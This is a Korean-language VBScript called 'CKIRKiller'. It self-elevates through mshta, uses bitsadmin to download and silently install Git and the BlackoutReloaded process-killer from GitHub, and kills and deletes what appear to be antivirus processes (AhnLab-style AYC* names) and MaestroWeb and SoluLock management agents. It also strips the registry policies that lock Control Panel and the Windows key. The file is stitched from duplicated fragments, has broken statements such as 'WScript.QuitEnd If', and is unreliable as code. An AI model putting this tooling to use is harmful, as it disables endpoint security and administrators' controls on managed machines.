Option Explicit

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CLASSES_ROOT  = &H80000000
Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002

Const GitPath      = "C:\Program Files\Git"
Const GitExe       = "C:\Program Files\Git\git-bash.exe"
Const BlackoutExe  = "C:\Program Files\Git\BlackoutReloaded.exe"
Const GitInstaller = "C:\Windows\Temp\Git-Inst.exe"
Const BlackoutTmp  = "C:\Windows\Temp\Blackout.exe"
Const MaestroDir   = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL       = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL  = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"
Const SetUserFTAExe   = "C:\Program Files\Git\SetUserFTA.exe"
Const SetUserFTATmp   = "C:\Windows\Temp\SetUserFTA.exe"
Const SetUserFTAURL   = "https://github.com/bicheondev/C/raw/refs/heads/main/SetUserFTA.exe"

EnsureAdmin
PrepareTools
RunKillStages

If MsgBox("한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
          "(메모장에 있는 코드를 복붙하는 귀찮은 과정이 포함됩니다.)" & vbCrLf & vbCrLf & _
          "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
          vbYesNo + vbQuestion, "CKIRKiller") = vbYes Then
    ShowHancomGuide
End If

If MsgBox("Chrome을 기본 브라우저로 설정하시겠습니까?" & vbCrLf & _

' ------------------------------------------------------------
' ACTUAL LOGIC (This part runs only in ANSI environment)
' ------------------------------------------------------------

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const GitPath = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const MaestroDir = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' Step 1: 시작 질문
Dim nHancomRes
nHancomRes = MsgBox("한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
                    "(메모장에 있는 코드를 복붙하는 귀찮은 과정이 포함됩니다.)" & vbCrLf & vbCrLf & _
                    "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
                    vbYesNo + vbQuestion, "CKIRKiller")

' Core Process (Git/Blackout)
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & GitURL & """ ""C:\Windows\Temp\Git-Inst.exe""", 0, True
    oShell.Run """C:\Windows\Temp\Git-Inst.exe"" /VERYSILENT /NORESTART", 0, True
End If

If Not oFSO.FileExists(BlackoutExe) Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & BlackoutURL & """ ""C:\Windows\Temp\Blackout.exe""", 0, True
    oFSO.MoveFile "C:\Windows\Temp\Blackout.exe", BlackoutExe
End If

' Kill Processes
Dim arr, t
arr = Array("qukapttp.exe", "nfowjxyfd.exe", "lqndauccd.exe", "rwtyijsa.exe", "nhfneczzm.exe", "AYCWSSrv.ayc", "AYCRTSrv.ayc", "AYIASrv.exe", "AYCUpdSrv.ayc", "AYCMain.ayc", "AYCAgent.ayc", "AYCRTSrv.exe", "AYIASrv.exe", "Yoondisk_hd_recv.exe", "yoondisk_chplayer.exe", "MaestroWebSvr.exe", "MaestroWebAgent.exe", "SoluLock.exe")
For Each t In arr
    oShell.Run """" & BlackoutExe & """ " & t, 0, True
Next

' Unlock Policies
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage"
oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map"

' Restart Explorer
On Error Resume Next
oShell.Run "taskkill /F /IM explorer.exe", 0, True
WScript.Sleep 1000
oShell.Run "explorer.exe", 0, False
On Error GoTo 0

' Step 2: 한컴 수동 안내 (Alert 우선 순위 조정)
If nHancomRes = vbYes Then
    Dim psFixTxt : psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"
    Dim oT : Set oT = oFSO.CreateTextFile(psFixTxt, True)
    oT.WriteLine "=========================================================="
    oT.WriteLine "한컴 입력기 수동 최적화 가이드"
    oT.WriteLine "=========================================================="
    oT.WriteLine "1. 아래 5줄의 명령어를 복사(Ctrl+C)합니다."
    oT.WriteLine "2. PowerShell ISE 하단 입력창에 붙여넣기(Ctrl+V) 후 엔터."
    oT.WriteLine ""
    oT.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
    oT.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
    oT.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
    oT.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force"
    oT.Write "Start-Process ""ctfmon.exe""" ' WriteLine 대신 Write를 사용하여 마지막 엔터 제거
    oT.Close
    
    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
    oShell.Run "powershell_ise.exe", 1, False
    
    ' 창들이 뜰 시간을 준 뒤, 가장 위로 오게 Alert 실행
    WScript.Sleep 800 
    MsgBox "메모장 가이드가 열렸습니다. 안내에 따라 코드를 복사해서 파란색 창(ISE)에 붙여넣어 주세요.", vbInformation + vbSystemModal, "Guide"
End If

' Step 3: 최종 완료 (잠시 쉬었다가 실행)
WScript.Sleep 500
Dim finalMsg
finalMsg = "모든 최적화 작업이 완료되었습니다!" & vbCrLf & _
           "제어판 및 Windows 키 해금을 적용하려면 로그아웃이 필요합니다." & vbCrLf & vbCrLf & _
           "필요하시면 작업 중인 문서를 모두 저장하시고 '예(Y)'를 눌러 로그아웃하세요. (로그아웃이라 데이터 안 날아감)"

If MsgBox(finalMsg, vbYesNo + vbInformation + vbSystemModal, "CKIRKiller") = vbYes Then
    oWMI.ExecQuery("Select * from Win32_OperatingSystem").ItemIndex(0).Win32Shutdown(4)
End If

WScript.QuitEnd If
On Error GoTo 0

If Not bAdmin Then
    Dim sScript : sScript = WScript.ScriptFullName
    oShell.Run "mshta vbscript:Execute(""CreateObject(""""Shell.Application"""").ShellExecute """"wscript.exe"""","""""""""  & sScript & """"""""",,""""runas"""",1:close"")", 0, False
    WScript.Quit
End If

' ── Main ────────────────────────────────────────────────────
MsgBox "작업이 시작됩니다." & vbCrLf & _
       "자동적으로 각 작업이 진행되니 확인 버튼만 클릭하면 됩니다.", _
       vbInformation, "CKIRKiller"

' STEP 1: Install Git
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    MsgBox "1/3단계: Git 다운로드 중(시간이 다소 소요됩니다)...", vbInformation, "CKIRKiller"
    BitsDownload GitURL, GitInstaller
    MsgBox "1/3단계: Git 설치 중...", vbInformation, "CKIRKiller"
    oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
End If

' STEP 2: Place BlackoutReloaded.exe
If Not oFSO.FileExists(BlackoutExe) Then
    MsgBox "2/3단계: BlackoutReloaded.exe 다운로드 중...", vbInformation, "CKIRKiller"
    BitsDownload BlackoutURL, BlackoutTmp
    oFSO.MoveFile BlackoutTmp, BlackoutExe
End If

' STEP 3: Kill wave 1 targets ? resolve path via WMI, then kill + delete
MsgBox "3/3단계: 프로세스 종료 및 제거 중...", vbInformation, "CKIRKiller"
BlackoutWithPath "qukapttp.exe"
BlackoutWithPath "nfowjxyfd.exe"
BlackoutWithPath "lqndauccd.exe"
BlackoutWithPath "AYCWSSrv.ayc"
BlackoutWithPath "AYCRTSrv.ayc"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "AYCUpdSrv.ayc"
BlackoutWithPath "nhfneczzm.exe"
BlackoutAndDelete "MaestroWebSvr.exe"
BlackoutAndDelete "MaestroWebAgent.exe"
BlackoutAndDelete "SoluLock.exe"
If oFSO.FolderExists(MaestroDir) Then
    DeleteFolderContents MaestroDir
End If

MsgBox "작업이 완료되었습니다.", vbInformation, "CKIRKiller"

WScript.Quit

' ============================================================
'  Helpers
' ============================================================

Sub BitsDownload(sURL, sDest)
    On Error Resume Next
    oFSO.DeleteFile sDest, True
    On Error GoTo 0
    oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
End Sub

' Resolve the executable's full path from WMI, kill it, then delete the file
Sub BlackoutWithPath(sExe)
    Dim sFilePath : sFilePath = ""

    ' Query WMI for the running process to get its ExecutablePath
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then
            sFilePath = oProc.ExecutablePath
        End If
    Next

    ' Kill via taskkill + BlackoutReloaded (sync)
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, True
    WScript.Sleep 300
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, True

    ' Delete the file if we found its path
    If sFilePath <> "" Then
        On Error Resume Next
        oFSO.DeleteFile sFilePath, True
        On Error GoTo 0
    End If
End Sub

' Kill wave 2 async, delete immediately while process is dying
Sub BlackoutAndDelete(sExe)
    Dim sFilePath : sFilePath = MaestroDir & "\" & sExe

    ' Resolve actual path via WMI in case it differs
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
    Next

    ' Fire async ? don't wait so delete races the kill
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, False

    WScript.Sleep 50
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0

    WScript.Sleep 200
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
    Dim oFile, oSub
    For Each oFile In oFolder.Files
        On Error Resume Next
        oFile.Delete True
        On Error GoTo 0
    Next
    For Each oSub In oFolder.SubFolders
        On Error Resume Next
        oSub.Delete True
        On Error GoTo 0
    Next
End Sub
